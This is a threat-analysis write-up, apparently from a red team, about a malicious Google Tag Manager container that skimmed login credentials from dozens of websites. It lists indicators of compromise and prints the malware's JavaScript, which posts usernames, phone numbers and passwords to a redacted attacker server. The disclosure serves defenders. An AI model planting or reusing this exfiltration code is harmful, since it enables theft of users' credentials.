# Google Tag Manager (GTM) Keylogger

---

During red team engagement, we discovered a malicious Google Tag Manager (GTM) keylogger in the wild.

![img](https://i.imgur.com/yEcvuWF.png)


#### Disclaimer: 

Some information has been redacted to protect our client's identity and the victims' data. However, the relevant details can be obtained by analyzing the script. We bear no responsibility for any misuse of this data. 

#### What is Google Tag Manager (GTM)

Google Tag Manager is a tool used to manage and deploy marketing and analytics tags (such as Google Analytics, Facebook Pixel, or custom JavaScript snippets) on a website without modifying the website's code directly. 

![img](https://i.imgur.com/5SpLoUE.png)

In this case, the malicious GTM script disguised itself as a legitimate marketing script. However, upon inspecting website traffic, we noticed an unknown external request being sent to **redacted.com**

## Indicators of Compromise (IoC):

Filename: GTM-N749G7NX

Infected GTM: https://www.googletagmanager.com/gtm.js?id=GTM-N749G7NX

MD5: d45af33f6812e42bf70fff90fc5ffb95

SHA-1: cb260373ec5f4ab65bf4fa4ae04fae593162398c

![img](https://i.imgur.com/hXahVqs.png)

At the time of writing, VirusTotal does not flag this as malicious.
## Analysis of the Malicious GTM Script

Our team extracted and analyzed all JavaScript files on the compromised website. During this process, we identified a GTM script in disguise. Upon deeper inspection, a major red flag was uncovered.


## How This Malicious Script Works:

1. Extracts User Data: Retrieves the username, mobile, password, and URL from macros (likely within a website or tracking system).
2. Checks for Mobile Presence: If the mobile variable exists, it executes the attack.
3. Exfiltrates Stolen Data: Uses an XMLHttpRequest to send the extracted credentials to:
https://**redacted**.biz/dashboard_gtm/api/my/gtmregister_my.php


### Malicious Google Tag Manager (GTM) Script Breakdown

#### 1. Credential Keylogging

```javascript
[..snippet..]
    var username = ["escape", ["macro", 3], 8, 16],
        mobile = ["escape", ["macro", 4], 8, 16],
        password = ["escape", ["macro", 5], 8, 16],
        url = ["escape", ["macro", 2], 8, 16];

    if (mobile) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://**redacted**.biz/dashboard_gtm/api/my/gtmregister_my.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function() {};
        xhr.send(
            "mobile=" + encodeURIComponent(mobile) +
            "&username=" + encodeURIComponent(username) +
            "&password=" + encodeURIComponent(password) +
            "&url=" + encodeURIComponent(url)
        );
    }
[..snippet..]

````

Purpose: This script steals user credentials (username, mobile number, password, and URL).

Trigger: Executes if the mobile variable exists.

Exfiltration: Sends stolen data to https://**redacted**.biz/dashboard_gtm/api/my/gtmregister_my.php.

-----

#### 2. Depositi Tracking

```javascript
[..snippet..]
    var username = ["escape", ["macro", 6], 8, 16],
        url = ["escape", ["macro", 2], 8, 16];

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://**redacted**.biz/dashboard_gtm/api/my/gtmdeposit_my.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {};
    xhr.send(
        "username=" + encodeURIComponent(username) +
        "&url=" + encodeURIComponent(url)
    );
</script>

[..snippet..]
```

Purpose: Tracks and identify where the stolen data from which infected website.

Data Sent: Username and URL.

Exfiltration: Sends data to https://**redacted**.biz/dashboard_gtm/api/my/gtmdeposit_my.php

---


## The Hacker's Mistake & Further Findings

![img](https://i.imgur.com/9jVH39l.png)

The attacker left an open vulnerability on their website, allowing our team to gain deeper insights into their infrastructure.

![img](https://i.imgur.com/DM1DQ2W.png)

Sample victim data on hacker's website.

## Scope of the Attack

Our analysis indicates that this malicious GTM script has spread across eight countries, affecting:

Malaysia, Indonesia, Thailand, Bangladesh, Australia, Hong Kong, Vietnam, Singapore


Impact:
At least 66 websites have been compromised. A total of 27,281 user credentials have been stolen.

## Conclusion

This incident highlights the growing risk of supply-chain attacks leveraging GTM. We strongly recommend conducting security audits on GTM implementations and monitoring outbound traffic for suspicious requests.

kaizensecurity@2025
